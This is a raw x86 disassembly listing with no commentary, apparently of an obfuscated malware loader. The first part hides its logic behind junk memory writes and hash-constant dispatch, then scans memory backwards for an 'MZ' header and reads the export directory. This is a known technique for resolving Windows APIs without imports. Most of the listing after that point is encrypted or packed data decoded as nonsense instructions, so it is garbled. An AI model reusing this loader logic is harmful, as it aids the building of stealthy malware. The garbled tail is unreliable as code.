  41e0bf:	mov    DWORD PTR ds:0x428e3f,0x1354
  41e0c9:	jne    0x41e100
  41e0cf:	cmp    esi,ebx
  41e0d1:	mov    DWORD PTR ds:0x428e7b,0x261b
  41e0db:	jne    0x41e100
  41e0e1:	push   ebx
  41e0e2:	mov    DWORD PTR ds:0x428e67,0x2b68
  41e0ec:	push   0x70941f97
  41e0f1:	mov    DWORD PTR ds:0x428e63,0x40d9
  41e0fb:	jmp    0x420786
  41e100:	mov    eax,ds:0x428eb7
  41e105:	mov    eax,DWORD PTR [ebp+0x18]
  41e108:	mov    esi,DWORD PTR [ebp+0x1c]
  41e10b:	cmp    eax,0x70941f97
  41e110:	mov    DWORD PTR ds:0x428ebb,0x3db6
  41e11a:	jne    0x41e147
  41e120:	cmp    esi,ebx
  41e122:	mov    DWORD PTR ds:0x428e5f,0x2bd8
  41e12c:	jne    0x41e147
  41e132:	push   ebx
  41e133:	mov    DWORD PTR ds:0x428e2b,0x15b3
  41e13d:	push   0x70941f95
  41e142:	jmp    0x420786
  41e147:	mov    DWORD PTR ds:0x428e73,0x7017
  41e151:	mov    eax,DWORD PTR [ebp+0x18]
  41e154:	mov    esi,DWORD PTR [ebp+0x1c]
  41e157:	mov    DWORD PTR ds:0x428e27,0x78f9
  41e161:	cmp    eax,0x70941f95
  41e166:	jne    0x41e19d
  41e16c:	mov    DWORD PTR ds:0x428ecf,0x6494
  41e176:	cmp    esi,ebx
  41e178:	jne    0x41e19d
  41e17e:	push   ebx
  41e17f:	mov    DWORD PTR ds:0x428ea3,0x58e0
  41e189:	push   0x70941f9b
  41e18e:	mov    DWORD PTR ds:0x428e3f,0x40d6
  41e198:	jmp    0x420786
  41e19d:	mov    DWORD PTR ds:0x428e93,edx
  41e1a3:	mov    eax,DWORD PTR [ebp+0x18]
  41e1a6:	mov    esi,DWORD PTR [ebp+0x1c]
  41e1a9:	mov    DWORD PTR ds:0x428e83,0x6338
  41e1b3:	cmp    eax,0x70941f9b
  41e1b8:	mov    DWORD PTR ds:0x428e53,0x174c
  41e1c2:	jne    0x41e203
  41e1c8:	mov    DWORD PTR ds:0x428e67,0x61b3
  41e1d2:	cmp    esi,ebx
  41e1d4:	mov    DWORD PTR ds:0x428e4b,0x6bb8
  41e1de:	jne    0x41e203
  41e1e4:	mov    DWORD PTR ds:0x428e2b,0x777c
  41e1ee:	push   ebx
  41e1ef:	push   0x70941f99
  41e1f4:	mov    DWORD PTR ds:0x428eb7,0x6b5e
  41e1fe:	jmp    0x420786
  41e203:	mov    eax,DWORD PTR [ebp+0x18]
  41e206:	not    edi
  41e208:	mov    esi,DWORD PTR [ebp+0x1c]
  41e20b:	mov    edi,0x70941f9d
  41e210:	cmp    eax,edi
  41e212:	jne    0x420747
  41e218:	cmp    esi,ebx
  41e21a:	jne    0x420747
  41e220:	mov    eax,DWORD PTR [ebp+0x10]
  41e223:	xor    eax,ecx
  41e225:	add    eax,edx
  41e227:	mov    DWORD PTR [ebp-0x20],eax
  41e22a:	mov    eax,DWORD PTR [ebp+0xc]
  41e22d:	mov    esi,DWORD PTR [ebp-0x8]
  41e230:	xor    eax,ecx
  41e232:	add    eax,edx
  41e234:	imul   eax,DWORD PTR [esi]
  41e237:	mov    esi,DWORD PTR [ebp+0x8]
  41e23a:	xor    esi,ecx
  41e23c:	add    esi,edx
  41e23e:	cmp    esi,eax
  41e240:	mov    eax,DWORD PTR [ebp-0x4]
  41e243:	mov    edi,0xffcd8d0a
  41e248:	je     0x41e267
  41e24e:	mov    esi,DWORD PTR [ebp-0x20]
  41e251:	add    DWORD PTR [eax],esi
  41e253:	mov    eax,DWORD PTR [ebp-0x4]
  41e256:	mov    esi,DWORD PTR [ebp+0xc]
  41e259:	xor    esi,ecx
  41e25b:	add    esi,edx
  41e25d:	imul   esi,DWORD PTR [eax]
  41e260:	mov    DWORD PTR [eax],esi
  41e262:	jmp    0x41e26c
  41e267:	mov    esi,DWORD PTR [ebp+0x14]
  41e26a:	xor    DWORD PTR [eax],esi
  41e26c:	mov    eax,DWORD PTR [ebp-0x4]
  41e26f:	mov    esi,DWORD PTR [ebp+0x10]
  41e272:	xor    esi,ecx
  41e274:	sub    edi,esi
  41e276:	add    DWORD PTR [eax],edi
  41e278:	mov    eax,DWORD PTR [ebp-0x4]
  41e27b:	mov    esi,DWORD PTR [ebp-0x8]
  41e27e:	add    esi,DWORD PTR [eax]
  41e280:	mov    DWORD PTR [ebp-0x8],esi
  41e283:	mov    eax,DWORD PTR [ebp+0xc]
  41e286:	mov    esi,DWORD PTR [ebp+0xc]
  41e289:	xor    esi,ecx
  41e28b:	xor    eax,ecx
  41e28d:	lea    eax,[eax+esi*1+0x64e5ec]
  41e294:	mov    esi,DWORD PTR [ebp+0xc]
  41e297:	xor    esi,ecx
  41e299:	add    esi,edx
  41e29b:	imul   eax,esi
  41e29e:	mov    esi,DWORD PTR [ebp+0xc]
  41e2a1:	xor    esi,ecx
  41e2a3:	sub    esi,eax
  41e2a5:	mov    eax,DWORD PTR [ebp-0x4]
  41e2a8:	add    esi,edx
  41e2aa:	cmp    DWORD PTR [eax],esi
  41e2ac:	mov    eax,DWORD PTR [ebp-0x4]
  41e2af:	mov    esi,DWORD PTR [ebp+0x10]
  41e2b2:	jg     0x41e2c8
  41e2b8:	xor    esi,ecx
  41e2ba:	mov    edi,0xffcd8d0a
  41e2bf:	sub    edi,esi
  41e2c1:	add    DWORD PTR [eax],edi
  41e2c3:	jmp    0x41e2ce
  41e2c8:	xor    esi,ecx
  41e2ca:	add    esi,edx
  41e2cc:	add    DWORD PTR [eax],esi
  41e2ce:	mov    eax,DWORD PTR [ebp-0x8]
  41e2d1:	mov    esi,DWORD PTR [ebp-0x10]
  41e2d4:	mov    eax,DWORD PTR [eax]
  41e2d6:	xor    esi,ecx
  41e2d8:	add    esi,0x3272f5
  41e2de:	mov    DWORD PTR [ebp-0x28],0x7097b85c
  41e2e5:	mov    DWORD PTR [ebp-0x24],ebx
  41e2e8:	not    esi
  41e2ea:	mov    DWORD PTR [ebp-0x30],0x7097a55e
  41e2f1:	mov    DWORD PTR [ebp-0x2c],ebx
  41e2f4:	mov    ebx,DWORD PTR [ebp-0x28]
  41e2f7:	mov    edi,DWORD PTR [ebp-0x24]
  41e2fa:	and    eax,esi
  41e2fc:	mov    esi,0xa143
  41e301:	xor    bx,si
  41e304:	mov    esi,0x412e
  41e309:	add    bx,si
  41e30c:	cmp    WORD PTR [eax],bx
  41e30f:	je     0x41e359
  41e315:	mov    edi,DWORD PTR [ebp-0x10]
  41e318:	xor    edi,ecx
  41e31a:	mov    DWORD PTR [ebp-0x28],0x7097b85c
  41e321:	mov    DWORD PTR [ebp-0x24],0xffffffff
  41e328:	mov    ebx,0xffcd8d0a
  41e32d:	sub    ebx,edi
  41e32f:	mov    DWORD PTR [ebp-0x30],0x7097a55e
  41e336:	add    eax,ebx
  41e338:	mov    DWORD PTR [ebp-0x2c],0xffffffff
  41e33f:	mov    edi,DWORD PTR [ebp-0x28]
  41e342:	mov    ebx,DWORD PTR [ebp-0x24]
  41e345:	mov    ebx,0xa143
  41e34a:	xor    di,bx
  41e34d:	add    di,si
  41e350:	cmp    WORD PTR [eax],di
  41e353:	jne    0x41e315
  41e359:	mov    edi,DWORD PTR [ebp-0x14]
  41e35c:	mov    edi,DWORD PTR [edi]
  41e35e:	mov    ebx,DWORD PTR [eax+0x3c]
  41e361:	lea    edi,[ebx+edi*8+0x78]
  41e365:	mov    edi,DWORD PTR [edi+eax*1]
  41e368:	mov    DWORD PTR [ebp-0x18],edi
  41e36b:	mov    edi,DWORD PTR [ebp+0x8]
  41e36e:	xor    edi,ecx
  41e370:	add    edi,edx
  41e372:	jmp    0x4206eb
  41e377:	push   esi
  41e378:	inc    eax
  41e379:	dec    ebp
  41e37a:	test   DWORD PTR ds:0xe2b09684,eax
  41e380:	(bad)  [ebx]
  41e382:	data16 ja 0x41e361
  41e385:	jle    0x41e37c
  41e387:	retf   
  41e388:	fiadd  DWORD PTR [edx-0x7c9fd87d]
  41e38e:	and    esp,0x53
  41e391:	ret    0x4ccc
  41e394:	mov    edx,0xbbf2c781
  41e399:	xor    al,0x15
  41e39b:	push   ds
  41e39c:	jae    0x41e38e
  41e39e:	lods   eax,DWORD PTR ds:[esi]
  41e39f:	sti    
  41e3a0:	mov    al,0x52
  41e3a2:	jecxz  0x41e413
  41e3a4:	push   ss
  41e3a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e3a6:	xchg   ebx,eax
  41e3a7:	add    al,0x2b
  41e3a9:	mov    edx,0x41a80bda
  41e3ae:	arpl   WORD PTR [eax],si
  41e3b0:	pop    ecx
  41e3b1:	inc    esp
  41e3b2:	jns    0x41e383
  41e3b4:	enter  0xd3f4,0x64
  41e3b8:	pushf  
  41e3b9:	jns    0x41e368
  41e3bb:	mov    ebx,0xa7175a0f
  41e3c0:	mov    al,0x7d
  41e3c2:	jge    0x41e3e5
  41e3c4:	inc    eax
  41e3c5:	daa    
  41e3c6:	cmp    ecx,DWORD PTR [eax]
  41e3c8:	dec    esp
  41e3c9:	inc    esp
  41e3ca:	sub    al,0x19
  41e3cc:	retf   0x6bb1
  41e3cf:	pusha  
  41e3d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e3d1:	ja     0x41e3ab
  41e3d3:	nop
  41e3d4:	adc    esp,esi
  41e3d6:	repz jno 0x41e3cc
  41e3d9:	imul   ebp,DWORD PTR [ebx+0x4e],0xfffffffd
  41e3dd:	pop    eax
  41e3de:	pop    edi
  41e3df:	or     BYTE PTR [ebx+0x35],0x78
  41e3e3:	or     eax,0xa59f9623
  41e3e8:	hlt    
  41e3e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e3ea:	neg    BYTE PTR [eax]
  41e3ec:	inc    ebp
  41e3ed:	leave  
  41e3ee:	sahf   
  41e3ef:	fwait
  41e3f0:	ins    BYTE PTR es:[edi],dx
  41e3f1:	pop    ebx
  41e3f2:	fsubr  QWORD PTR [edx]
  41e3f4:	inc    eax
  41e3f5:	ror    esp,1
  41e3f7:	addr16 jg 0x41e3d1
  41e3fa:	fnstsw WORD PTR [edx+0x100a61bf]
  41e400:	in     eax,dx
  41e401:	inc    ebx
  41e402:	push   edi
  41e403:	ficom  DWORD PTR [ebx]
  41e405:	lds    esp,FWORD PTR [edx-0x7b87372d]
  41e40b:	push   esp
  41e40c:	dec    esi
  41e40d:	or     DWORD PTR [eax],eax
  41e40f:	imul   DWORD PTR [eax+0x59fe3972]
  41e415:	pcmpgtd mm4,QWORD PTR [ebx]
  41e418:	out    dx,al
  41e419:	test   BYTE PTR cs:[ebx],ch
  41e41c:	in     al,dx
  41e41d:	xor    eax,0x1ab23b98
  41e422:	jmp    0x41e443
  41e424:	xchg   edx,eax
  41e425:	push   ds
  41e426:	mov    fs:0xf90620fc,eax
  41e42c:	aad    0xc2
  41e42e:	std    
  41e42f:	ja     0x41e46b
  41e431:	stos   DWORD PTR es:[edi],eax
  41e432:	dec    ebp
  41e433:	aas    
  41e434:	adc    BYTE PTR [eax],dh
  41e436:	add    eax,0xa95fda7b
  41e43b:	nop
  41e43c:	mov    ebp,0x4940d742
  41e441:	mov    edx,0xe351c48b
  41e446:	(bad)  
  41e448:	cdq    
  41e449:	sub    eax,0xfc1b2e16
  41e44e:	std    
  41e44f:	mov    ebp,0x417b5b66
  41e454:	scas   eax,DWORD PTR es:[edi]
  41e455:	in     eax,0x71
  41e457:	lods   eax,DWORD PTR ds:[esi]
  41e458:	inc    esi
  41e459:	(bad)  
  41e45a:	(bad)  [edx+eax*2-0x2a]
  41e45e:	jne    0x41e442
  41e460:	repz fist DWORD PTR [edx-0x6d]
  41e464:	sub    bh,BYTE PTR [ecx+edi*4-0x15c9dc9b]
  41e46b:	push   ss
  41e46c:	jge    0x41e41b
  41e46e:	ss icebp 
  41e470:	add    al,0xd5
  41e472:	(bad)  
  41e473:	jbe    0x41e416
  41e475:	push   edi
  41e476:	cdq    
  41e477:	xor    esi,DWORD PTR ds:0x3c7482d1
  41e47d:	jmp    0xb787:0x12559720
  41e484:	sbb    eax,0xe46744f9
  41e489:	fisubr WORD PTR [esi+0x74ad38ed]
  41e48f:	dec    edi
  41e490:	adc    eax,0x3b2fa7ab
  41e495:	mov    edi,0x5914911d
  41e49a:	stos   DWORD PTR es:[edi],eax
  41e49b:	or     ebx,DWORD PTR [edx-0x5e10a921]
  41e4a1:	sahf   
  41e4a2:	add    DWORD PTR [esi],edx
  41e4a4:	scas   al,BYTE PTR es:[edi]
  41e4a5:	adc    BYTE PTR [eax+eiz*8-0x2058a327],dl
  41e4ac:	ret    
  41e4ad:	lods   eax,DWORD PTR ds:[esi]
  41e4ae:	outs   dx,BYTE PTR ds:[esi]
  41e4af:	jg     0x41e45f
  41e4b1:	(bad)  
  41e4b2:	xchg   esi,eax
  41e4b3:	test   eax,0x5c02082a
  41e4b8:	push   esi
  41e4b9:	inc    ebx
  41e4ba:	add    ch,ch
  41e4bc:	stc    
  41e4bd:	(bad)  
  41e4be:	rcr    DWORD PTR [ecx+0x69e2fcf7],1
  41e4c4:	mov    al,0x3d
  41e4c6:	sbb    esp,DWORD PTR [esi]
  41e4c8:	cmp    BYTE PTR [eax],dl
  41e4ca:	push   ecx
  41e4cb:	xchg   ecx,eax
  41e4cc:	sbb    DWORD PTR [esi+0x79],esp
  41e4cf:	push   es
  41e4d0:	jl     0x41e498
  41e4d2:	in     eax,0x36
  41e4d4:	(bad)  
  41e4d5:	je     0x41e4bd
  41e4d7:	push   esp
  41e4d8:	dec    edx
  41e4d9:	call   0xf118:0x425bf35e
  41e4e0:	mov    ebp,0xf3e55d45
  41e4e5:	scas   eax,DWORD PTR es:[edi]
  41e4e6:	nop
  41e4e7:	scas   eax,DWORD PTR es:[edi]
  41e4e8:	sub    eax,0x7a2fa5cf
  41e4ed:	clc    
  41e4ee:	int3   
  41e4ef:	clc    
  41e4f0:	sbb    eax,0x817560da
  41e4f5:	xor    DWORD PTR [edi+ebp*2],edx
  41e4f8:	inc    eax
  41e4f9:	lds    esp,FWORD PTR [ebp-0x59]
  41e4fc:	bound  esi,QWORD PTR [edi+eax*1-0x40f9d8fe]
  41e503:	jl     0x41e4d9
  41e505:	mov    dl,0x57
  41e507:	fsub   DWORD PTR [ecx]
  41e509:	je     0x41e54c
  41e50b:	inc    ebp
  41e50c:	in     al,dx
  41e50d:	jmp    0x41e4a7
  41e50f:	mov    ds:0x3a2156fe,eax
  41e514:	jne    0x41e4d8
  41e516:	push   ds
  41e517:	fsub   QWORD PTR [ebx+ecx*4-0x26]
  41e51b:	push   0xb
  41e51d:	cdq    
  41e51e:	push   ecx
  41e51f:	mov    ah,0xb2
  41e521:	std    
  41e522:	call   0xc787:0x26ff5175
  41e529:	and    al,ah
  41e52b:	dec    ebx
  41e52c:	imul   BYTE PTR [esi-0x51ebba4f]
  41e532:	mov    ch,0x8a
  41e534:	jl     0x41e4c2
  41e536:	xchg   BYTE PTR [edi],bh
  41e538:	pop    eax
  41e539:	fmul   DWORD PTR [ebx-0x491d4b80]
  41e53f:	mov    eax,0x5f1b5b0b
  41e544:	xchg   BYTE PTR [ecx+0x37c407e8],ah
  41e54a:	jl     0x41e53a
  41e54c:	mov    esp,0x4fd7d4c9
  41e551:	push   ss
  41e552:	imul   edx,DWORD PTR [eax-0x3526616b],0xffffffa6
  41e559:	and    DWORD PTR [edx-0x2eabd4d9],eax
  41e55f:	cli    
  41e560:	cdq    
  41e561:	inc    ebp
  41e562:	jbe    0x41e569
  41e564:	cld    
  41e565:	push   0x2
  41e567:	add    al,0xa
  41e569:	call   0xbbc0:0x9c80a6ea
  41e570:	dec    ebp
  41e571:	outs   dx,BYTE PTR ds:[esi]
  41e572:	neg    DWORD PTR [eax-0x74]
  41e575:	(bad)  
  41e576:	ins    DWORD PTR es:[edi],dx
  41e577:	cmp    ah,BYTE PTR [ecx+edi*4]
  41e57a:	add    BYTE PTR [ebx+0x4b],cl
  41e57d:	test   al,0xa3
  41e57f:	call   0x8baf:0x308aaabb
  41e586:	push   esp
  41e587:	mov    edx,0xfc5d371f
  41e58c:	jg     0x41e5f8
  41e58e:	not    DWORD PTR [eax+0x4e]
  41e591:	popf   
  41e592:	imul   ebx,DWORD PTR [esp+edx*4],0x60
  41e596:	popf   
  41e597:	add    eax,0x6f6a6930
  41e59c:	ficomp WORD PTR [ebx-0x4e]
  41e59f:	cmp    DWORD PTR [ecx+ebx*2],ebx
  41e5a2:	sbb    eax,0xe653a6ee
  41e5a7:	xchg   al,al
  41e5a9:	add    cl,ah
  41e5ab:	sub    al,0x82
  41e5ad:	iret   
  41e5ae:	test   DWORD PTR [esi],edx
  41e5b0:	out    dx,eax
  41e5b1:	jno    0x41e620
  41e5b3:	jne    0x41e5fb
  41e5b5:	sar    ebp,1
  41e5b7:	std    
  41e5b8:	adc    ah,ch
  41e5ba:	pop    esi
  41e5bb:	popa   
  41e5bc:	das    
  41e5bd:	in     al,0x13
  41e5bf:	lds    esp,FWORD PTR [edi]
  41e5c1:	push   edx
  41e5c2:	ror    DWORD PTR [ebp+0x652d460b],0x52
  41e5c9:	xor    al,0x9f
  41e5cb:	das    
  41e5cc:	in     al,dx
  41e5cd:	dec    edi
  41e5ce:	adc    al,0xb4
  41e5d0:	shl    BYTE PTR [eax],0x1b
  41e5d3:	xchg   edi,eax
  41e5d4:	inc    esi
  41e5d5:	clc    
  41e5d6:	leave  
  41e5d7:	hlt    
  41e5d8:	std    
  41e5d9:	int3   
  41e5da:	inc    esi
  41e5db:	gs (bad) 
  41e5dd:	ja     0x41e64b
  41e5df:	popf   
  41e5e0:	mov    dl,dh
  41e5e2:	shr    DWORD PTR [edx-0x6],cl
  41e5e5:	cmc    
  41e5e6:	repnz mov ah,0x69
  41e5e9:	dec    eax
  41e5ea:	push   edx
  41e5eb:	mov    cl,0xce
  41e5ed:	mov    ?,ebx
  41e5ef:	xchg   BYTE PTR [ebp+ecx*2+0x191d45ad],bl
  41e5f6:	jp     0x41e62e
  41e5f8:	rol    DWORD PTR [edx+0x51253364],1
  41e5fe:	daa    
  41e5ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e600:	adc    bl,BYTE PTR [esi]
  41e602:	cwde   
  41e603:	ret    
  41e604:	and    ebx,DWORD PTR [edx]
  41e606:	ins    DWORD PTR es:[edi],dx
  41e607:	mov    ah,BYTE PTR [edi]
  41e609:	jmp    0x153b06c
  41e60e:	out    0x46,al
  41e610:	in     eax,0xa3
  41e612:	mov    dl,0x6
  41e614:	int3   
  41e615:	fisub  DWORD PTR [ecx]
  41e617:	adc    eax,0xba124f28
  41e61c:	sub    ebx,DWORD PTR [ecx+0x60]
  41e61f:	loope  0x41e616
  41e621:	stc    
  41e622:	mov    esi,0x7b816e42
  41e627:	sub    DWORD PTR [ecx],0x47
  41e62a:	bsr    ebx,DWORD PTR [edx+0x7c]
  41e62e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e62f:	aam    0x8d
  41e631:	lea    edi,[edi-0x9dd53ac]
  41e637:	push   0xf7489857
  41e63c:	sub    al,0x74
  41e63e:	lahf   
  41e63f:	inc    ecx
  41e640:	mov    edx,0x9cef1ef8
  41e645:	xor    DWORD PTR [edi+ebx*2-0x1ab3659a],edx
  41e64c:	adc    eax,0xe74bd3f1
  41e651:	mov    esp,0x8425981f
  41e656:	js     0x41e6cd
  41e658:	aaa    
  41e659:	mov    dh,0xde
  41e65b:	push   edi
  41e65c:	sbb    esi,DWORD PTR [ebx]
  41e65e:	cmovns ebx,DWORD PTR [edx+edi*4-0x5c]
  41e663:	xchg   ecx,eax
  41e664:	lahf   
  41e665:	js     0x41e5f5
  41e667:	addr16 popf 
  41e669:	stos   DWORD PTR es:[edi],eax
  41e66a:	(bad)  
  41e66b:	jns    0x41e62b
  41e66d:	icebp  
  41e66e:	nop
  41e66f:	mov    dl,0x5
  41e671:	cli    
  41e672:	mov    dl,0x3f
  41e674:	out    0x94,eax
  41e676:	push   ss
  41e677:	(bad)  
  41e678:	int3   
  41e679:	mov    ecx,0x9068c4de
  41e67e:	jecxz  0x41e6e6
  41e680:	test   DWORD PTR [ebx-0x4],esp
  41e683:	std    
  41e684:	clc    
  41e685:	adc    dh,0x36
  41e688:	loop   0x41e6ea
  41e68a:	sti    
  41e68b:	out    0x10,eax
  41e68d:	les    ebp,FWORD PTR [esi+0x4a]
  41e690:	jge    0x41e6dc
  41e692:	dec    ebp
  41e693:	add    eax,0xb2e0f425
  41e698:	sub    al,0xf4
  41e69a:	(bad)  
  41e69b:	in     al,0xa5
  41e69d:	xchg   DWORD PTR [ebx+ebx*8+0x7367ccab],esi
  41e6a4:	mov    cl,0x6f
  41e6a6:	jmp    0x8d2a:0x5fda94c6
  41e6ad:	xor    DWORD PTR [esi-0x27],esp
  41e6b0:	push   ebp
  41e6b1:	jg     0x41e663
  41e6b3:	retf   
  41e6b4:	or     BYTE PTR [eax-0x3a],cl
  41e6b7:	call   0x5b68:0x84209699
  41e6be:	repnz test BYTE PTR [ebp+0x4add47bf],ch
  41e6c5:	loope  0x41e6d7
  41e6c7:	(bad)  
  41e6c8:	cli    
  41e6c9:	adc    DWORD PTR [edx+0x74],esi
  41e6cc:	stc    
  41e6cd:	in     eax,0xf9
  41e6cf:	or     al,0x26
  41e6d1:	call   0x8e0232bc
  41e6d6:	shl    BYTE PTR [ecx],cl
  41e6d8:	cwde   
  41e6d9:	sbb    dh,BYTE PTR [esi+eiz*8-0x45]
  41e6dd:	fsubr  QWORD PTR [ebp+0x33]
  41e6e0:	dec    edi
  41e6e1:	pop    bp
  41e6e3:	cmp    BYTE PTR [ecx],al
  41e6e5:	out    0x72,al
  41e6e7:	or     ch,BYTE PTR [ecx-0x3a]
  41e6ea:	sahf   
  41e6eb:	(bad)  
  41e6ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e6ed:	adc    eax,0xf6d01ab3
  41e6f2:	(bad)  
  41e6f3:	cmp    eax,0x28ac7507
  41e6f8:	pop    ecx
  41e6f9:	jmp    0x9213:0x8e65adde
  41e700:	rcr    BYTE PTR [edi-0x735db678],cl
  41e706:	mov    cl,0xb9
  41e708:	(bad)  
  41e709:	loope  0x41e781
  41e70b:	(bad)  
  41e70c:	scas   eax,DWORD PTR es:[edi]
  41e70d:	or     DWORD PTR [ebp+0x1f39c5d3],0xeb999226
  41e717:	test   BYTE PTR [edi+ebx*4],cl
  41e71a:	scas   eax,DWORD PTR es:[edi]
  41e71b:	lods   al,BYTE PTR ds:[esi]
  41e71c:	xchg   DWORD PTR [eax+ebx*2-0x79],ebx
  41e720:	push   0x48
  41e722:	in     al,0x77
  41e724:	out    0xf9,al
  41e726:	ss cmp bl,ch
  41e729:	dec    ebx
  41e72a:	fdiv   QWORD PTR [ebx-0x50]
  41e72d:	xchg   ecx,eax
  41e72e:	pop    ebp
  41e72f:	jno    0x41e6fe
  41e731:	js     0x41e743
  41e733:	xor    al,bl
  41e735:	(bad)  
  41e736:	out    0xf8,eax
  41e738:	mov    esp,0x9310fef0
  41e73d:	xor    BYTE PTR [edi-0x5c],bl
  41e740:	(bad)  
  41e742:	lea    esp,[ebp+ebx*1-0x1fa440ed]
  41e749:	retf   
  41e74a:	add    BYTE PTR [esi],0xbc
  41e74d:	stos   DWORD PTR es:[edi],eax
  41e74e:	out    0xe0,eax
  41e750:	jp     0x41e6e6
  41e752:	call   0xa48afe6c
  41e757:	lods   al,BYTE PTR ds:[esi]
  41e758:	cwde   
  41e759:	(bad)  
  41e75a:	dec    eax
  41e75b:	add    dl,ah
  41e75d:	fiadd  WORD PTR [eax]
  41e75f:	mov    cl,0x35
  41e761:	push   edx
  41e762:	scas   eax,DWORD PTR es:[edi]
  41e763:	push   esp
  41e764:	mov    dh,BYTE PTR [ebp+0x23]
  41e767:	jns    0x41e70a
  41e769:	rcr    BYTE PTR [eax],cl
  41e76b:	inc    ebx
  41e76c:	xchg   esp,eax
  41e76d:	xchg   edx,eax
  41e76e:	dec    ecx
  41e76f:	int    0x4c
  41e771:	push   0xffffffd0
  41e773:	out    dx,eax
  41e774:	pop    esi
  41e775:	push   ds
  41e776:	jbe    0x41e74a
  41e778:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e779:	xchg   edx,eax
  41e77a:	and    BYTE PTR [ecx+ecx*4+0x29e1886d],dh
  41e781:	xchg   esi,eax
  41e782:	jecxz  0x41e790
  41e784:	retf   0x26d4
  41e787:	push   0x46
  41e789:	outs   dx,BYTE PTR ds:[esi]
  41e78a:	out    0x77,al
  41e78c:	sbb    al,0x8a
  41e78e:	(bad)  
  41e78f:	jecxz  0x41e71d
  41e791:	icebp  
  41e792:	(bad)  
  41e793:	lock push ss
  41e795:	out    dx,al
  41e796:	jmp    0x41e7e2
  41e798:	mul    DWORD PTR [ecx+0x53]
  41e79b:	dec    ebp
  41e79c:	or     al,0xdd
  41e79e:	imul   ebx,DWORD PTR [eax+0x6ea864f8],0x44
  41e7a5:	dec    eax
  41e7a6:	fld    DWORD PTR [edx]
  41e7a8:	sub    al,BYTE PTR gs:[edi]
  41e7ab:	test   DWORD PTR [edx+0x6e],edi
  41e7ae:	dec    esi
  41e7af:	int    0xd9
  41e7b1:	jo     0x41e7a8
  41e7b3:	xor    eax,edi
  41e7b5:	adc    ebx,DWORD PTR [ecx+ebx*2-0x27]
  41e7b9:	repnz (bad) 
  41e7bb:	fucom  st(3)
  41e7bd:	das    
  41e7be:	ret    
  41e7bf:	mov    esi,0xed36720e
  41e7c4:	sti    
  41e7c5:	jg     0x41e752
  41e7c7:	jmp    0xed63:0xcedd3457
  41e7ce:	xchg   edi,eax
  41e7cf:	xchg   esp,eax
  41e7d0:	jo     0x41e7ac
  41e7d2:	gs pop ebp
  41e7d4:	lea    esp,[ebp+0x18]
  41e7d7:	add    al,0x4b
  41e7d9:	push   ds
  41e7da:	cmp    al,0xf1
  41e7dc:	ja     0x41e846
  41e7de:	mov    DWORD PTR [esi-0x2eefce75],0x508c7188
  41e7e8:	out    dx,al
  41e7e9:	pop    ds
  41e7ea:	in     eax,0x9e
  41e7ec:	push   ebp
  41e7ed:	adc    al,BYTE PTR [ebx+0x5d]
  41e7f0:	inc    ebp
  41e7f1:	jmp    0xa6cd:0x4b73a24e
  41e7f8:	xor    eax,0xdb25937a
  41e7fd:	push   eax
  41e7fe:	jmp    0x41e799
  41e800:	mov    dh,0xe7
  41e802:	xchg   ecx,eax
  41e803:	mov    ecx,ss
  41e805:	jns    0x41e7f2
  41e807:	jo     0x41e7c1
  41e809:	sti    
  41e80a:	push   es
  41e80b:	nop
  41e80c:	xor    eax,0x7c36aa4d
  41e811:	and    DWORD PTR [edi+0x6b],ecx
  41e814:	les    esi,FWORD PTR [eax]
  41e816:	dec    ebp
  41e817:	outs   dx,BYTE PTR ds:[esi]
  41e818:	add    ch,BYTE PTR [esi]
  41e81a:	lods   eax,DWORD PTR ds:[esi]
  41e81b:	mov    BYTE PTR [ebx+0x40],bh
  41e81e:	mov    esi,0xb58eb1ce
  41e823:	mov    edi,0x26ddf20
  41e828:	les    eax,FWORD PTR [ebx+0x5d7d4f48]
  41e82e:	pop    ss
  41e82f:	icebp  
  41e830:	inc    edx
  41e831:	in     al,dx
  41e832:	out    dx,al
  41e833:	gs mov edi,0x8a69ca3a
  41e839:	(bad)  
  41e83a:	sub    BYTE PTR [ebp-0x72],0x6e
  41e83e:	out    0x76,eax
  41e840:	inc    ebp
  41e841:	xchg   edx,eax
  41e842:	fnstsw WORD PTR [bx-0x63]
  41e846:	mov    edi,0x330839ed
  41e84b:	je     0x41e823
  41e84d:	call   0xea38:0x7f46b2f
  41e854:	xchg   BYTE PTR [edi],bh
  41e856:	xor    esp,ebx
  41e858:	ins    BYTE PTR es:[edi],dx
  41e859:	test   BYTE PTR [edx],dl
  41e85b:	imul   ebp,DWORD PTR ds:0xbedd3070,0x75
  41e862:	pop    eax
  41e863:	adc    ebp,DWORD PTR [ecx]
  41e865:	dec    eax
  41e866:	sar    DWORD PTR [eax-0x2f],cl
  41e869:	inc    ebp
  41e86a:	jmp    0x41e889
  41e86c:	and    ecx,edi
  41e86e:	scas   al,BYTE PTR es:[edi]
  41e86f:	xor    BYTE PTR [ebx+0x6e],dh
  41e872:	out    dx,al
  41e873:	mov    WORD PTR [ecx],fs
  41e875:	mov    eax,ds:0x3a86cf33
  41e87a:	lods   eax,DWORD PTR ds:[esi]
  41e87b:	ficomp DWORD PTR [ebx-0x47]
  41e87e:	dec    eax
  41e87f:	inc    esp
  41e880:	dec    edx
  41e881:	(bad)  
  41e882:	lahf   
  41e883:	adc    esi,DWORD PTR [ecx]
  41e885:	pop    eax
  41e886:	icebp  
  41e887:	mov    bl,0xef
  41e889:	in     eax,dx
  41e88a:	adc    eax,0xca82f277
  41e88f:	bnd jb 0x41e90e
  41e892:	cld    
  41e893:	ds sbb ch,cl
  41e896:	pop    ebx
  41e897:	adc    eax,0xca51598f
  41e89c:	cwde   
  41e89d:	fldenv [eax+0x4a]
  41e8a0:	std    
  41e8a1:	in     eax,dx
  41e8a2:	call   0x5fd:0x448e4146
  41e8a9:	imul   eax,DWORD PTR [ebx-0x4a9683dc],0xffffffd4
  41e8b0:	mov    BYTE PTR [edx+0x2ad04327],dl
  41e8b6:	push   cs
  41e8b7:	aaa    
  41e8b8:	sub    al,0x22
  41e8ba:	sub    eax,0x1b577584
  41e8bf:	data16 aam 0x96
  41e8c2:	dec    ebp
  41e8c3:	jmp    DWORD PTR [ebp+0x5]
  41e8c6:	push   ebx
  41e8c7:	test   DWORD PTR [eax],eax
